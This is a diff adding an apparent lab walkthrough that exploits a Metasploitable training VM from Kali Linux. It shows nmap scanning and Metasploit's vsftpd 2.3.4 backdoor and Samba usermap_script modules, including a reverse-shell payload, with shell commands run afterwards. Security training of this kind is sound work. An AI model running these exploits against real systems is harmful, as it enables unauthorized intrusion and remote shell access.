@@ -1,0 +1,97 @@
+Step 1: Start Metasploitable VM
+1. Open VMware/VirtualBox.
+2. Power on the Metasploitable virtual machine.
+3. Login using:
+o	Username: msfadmin
+o	Password: msfadmin
+4. enter:
+   $ ifconfig
+5. Note down the eth0 inet IP address of the Metasploitable machine.
+
+Step 2: Scan Metasploitable Using Nmap
+1. Open the Kali Linux virtual machine.
+2. Open Nmap/Zenmap.
+3. Enter the Metasploitable IP address as the target.
+4. Select Intense Scan.
+5. Click Scan.
+6. Check the list of open ports and services.
+For example:
+21/tcp   open   ftp   vsftpd 2.3.4
+Here, FTP service on port 21 is selected for the authorized lab demonstration.
+
+Step 3: Start Metasploit Framework
+1. Open the terminal in Kali Linux.
+2. Start Metasploit using:
+   $ msfconsole
+3. Search for an exploit related to the detected FTP service:
+   $ search vsftpd
+4. Identify the exploit corresponding to vsftpd 2.3.4.
+
+Step 4: Select the FTP Exploit
+1. Select the identified exploit:
+use exploit/unix/ftp/vsftpd_234_backdoor
+2. Display information about the exploit:
+   $ info
+3. Check the available configuration options:
+   $ show options
+4. Set the target Metasploitable IP address:
+   $ set RHOST <Metasploitable-IP>
+Note:-Some system asking LHOST also use command(set LHOST <Kali_IP>)
+
+Step 5: Check and Select Payload
+1. Display the available payloads:
+   $ show payloads
+2. Select the appropriate payload for the lab environment:
+   $ set payload cmd/unix/interact
+3. Verify the configured options:
+   $ show options
+4. Run the exploit:
+   $ exploit
+5. If a session is obtained, perform basic authorized Linux commands such as:
+   $ ls
+   $ pwd
+   $ whoami
+
+Exploitation of Port 445 – Samba
+Step 6: Identify the Samba Service
+1. Return to the Nmap scan results.
+2. Look for port 445.
+3. Identify the Samba version running on the Metasploitable machine.
+4. In Metasploit, search for the corresponding Samba vulnerability:
+   $ search samba
+(or)
+5. If the scan identifies Samba 3.0.20, search specifically for it:
+   $ search 3.0.20
+
+Step 7: Select the Samba Exploit
+1. Select the appropriate authorized lab exploit:
+   $ use exploit/multi/samba/usermap_script
+2. Display exploit information:
+   $ info
+3. Check the required options:
+   $ show options
+
+Step 8: Configure the Target
+1. Set the Metasploitable IP address:
+   $ set RHOST 192.168.23.129
+2. Verify the configuration:
+   $ show options
+3. Display available payloads:
+   $ show payloads
+
+Step 9: Select Payload and Execute
+1. Select the required payload:
+   $ set payload cmd/unix/reverse
+2. Verify the settings:
+   $ show options
+3. Execute the exploit:
+   $ exploit
+4. If the authorized lab session is successfully established, verify it using basic commands.
+
+Step 10: Execute Basic Linux Commands
+After obtaining the lab session, execute:
+   $ ls
+To move to the home directory:
+   $ cd /home
+To display the contents of the file:
+   $ cat nohup.out
